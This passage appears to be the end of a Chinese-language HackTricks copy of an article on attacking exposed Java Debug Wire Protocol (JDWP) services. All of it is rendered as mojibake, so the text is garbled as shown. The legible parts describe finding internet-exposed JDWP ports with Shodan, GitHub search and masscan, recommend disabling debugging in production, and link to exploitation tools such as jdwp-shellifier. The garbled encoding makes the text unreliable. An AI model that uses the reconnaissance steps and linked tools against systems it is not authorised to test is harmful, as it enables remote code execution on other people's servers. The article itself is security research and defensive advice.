äº‹å®ä¸Šï¼ŒJDWPåœ¨Javaåº”ç”¨ç¨‹åºä¸–ç•Œä¸­ä½¿ç”¨ç›¸å½“å¹¿æ³›ã€‚ç„¶è€Œï¼Œæ¸—é€æµ‹è¯•äººå‘˜åœ¨è¿›è¡Œè¿œç¨‹è¯„ä¼°æ—¶å¯èƒ½ä¸ä¼šç»å¸¸çœ‹åˆ°å®ƒï¼Œå› ä¸ºé˜²ç«å¢™ä¼šï¼ˆä¹Ÿåº”è¯¥ï¼‰å¤§å¤šæ•°æƒ…å†µä¸‹é˜»æ­¢è¿è¡Œå®ƒçš„ç«¯å£ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€åœ¨é‡å¤–æ‰¾ä¸åˆ°JDWPï¼š

* åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œå¿«é€Ÿæœç´¢ShodanHQ\[4]ç«‹å³æ˜¾ç¤ºäº†å¤§çº¦40å°æœåŠ¡å™¨å‘é€JDWPæ¡æ‰‹ï¼š

![](https://ioactive.com/wp-content/uploads/2014/04/shodan.png)

è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªæœ‰è¶£çš„å‘ç°ï¼Œå› ä¸ºæ­£å¦‚æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„ï¼Œåº”è¯¥æ˜¯å®¢æˆ·ç«¯ï¼ˆè°ƒè¯•å™¨ï¼‰å¼€å§‹å¯¹è¯ã€‚

* GitHub\[7] ä¹Ÿæ˜¾ç¤ºäº†å¤§é‡å¯èƒ½å­˜åœ¨æ¼æ´çš„å¼€æºåº”ç”¨ç¨‹åºï¼š

![](https://ioactive.com/wp-content/uploads/2014/04/github.png)

* ä½¿ç”¨masscanåœ¨äº’è”ç½‘ä¸Šå¯»æ‰¾ç‰¹å®šç«¯å£ï¼ˆtcp/8000, tcp/8080, tcp/8787, tcp/5005ï¼‰å‘ç°äº†è®¸å¤šä¸»æœºï¼ˆåœ¨æ­¤æ— æ³•æŠ¥å‘Šï¼‰å“åº”åˆå§‹æ¡æ‰‹ã€‚
* åœ¨é‡å¤–å‘ç°äº†è¿è¡ŒJDWPæœåŠ¡çš„â€œä¼ä¸šâ€åº”ç”¨ç¨‹åº\*é»˜è®¤\*ï¼ˆæ‰¾åˆ°å®é™…çš„ç«¯å£å·ç•™ç»™å¥½å¥‡çš„è¯»è€…ä½œä¸ºç»ƒä¹ ï¼‰ã€‚

è¿™äº›åªæ˜¯åœ¨äº’è”ç½‘ä¸Šå‘ç°å¼€æ”¾JDWPæœåŠ¡çš„å‡ ç§æ–¹å¼ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æé†’ï¼Œåº”ç”¨ç¨‹åºåº”å®šæœŸè¿›è¡Œå½»åº•çš„å®‰å…¨å®¡æŸ¥ï¼Œç”Ÿäº§ç¯å¢ƒåº”å…³é—­ä»»ä½•è°ƒè¯•åŠŸèƒ½ï¼Œé˜²ç«å¢™åº”é…ç½®ä¸ºä»…é™åˆ¶è®¿é—®æ­£å¸¸æ“ä½œæ‰€éœ€çš„æœåŠ¡ã€‚å…è®¸ä»»ä½•äººè¿æ¥åˆ°JDWPæœåŠ¡å°±åƒå…è®¸è¿æ¥åˆ°gdbserveræœåŠ¡ä¸€æ ·ï¼ˆå¯èƒ½æ˜¯æ›´ç¨³å®šçš„æ–¹å¼ï¼‰ã€‚æˆ‘å¸Œæœ›ä½ å–œæ¬¢é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼Œå°±åƒæˆ‘å–œæ¬¢ç©JDWPä¸€æ ·ã€‚ç¥ä½ ä»¬æ‰€æœ‰å¼ºå¤§çš„æµ·ç›—ï¼Œå¿«ä¹çš„JDWPå¾æœï¼ï¼

**æ„Ÿè°¢**\
\
æˆ‘æƒ³æ„Ÿè°¢Ilja Van Sprundelå’ŒSebastien Mackeä¸ºä»–ä»¬çš„æƒ³æ³•å’Œæµ‹è¯•ã€‚

### **å‚è€ƒèµ„æ–™ï¼š**

1. [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
2. [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
3. http://www.secdev.org/projects/scapyï¼ˆä¸å†æ´»è·ƒï¼‰
4. [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
5. http://www.hsc-news.com/archives/2013/000109.htmlï¼ˆä¸å†æ´»è·ƒï¼‰
6. [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
7. https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
8. [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
9. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
10. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
11. [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½HackTricksçš„PDF**ï¼ŸæŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**hacktricks repo**](https://github.com/carlospolop/hacktricks) å’Œ [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
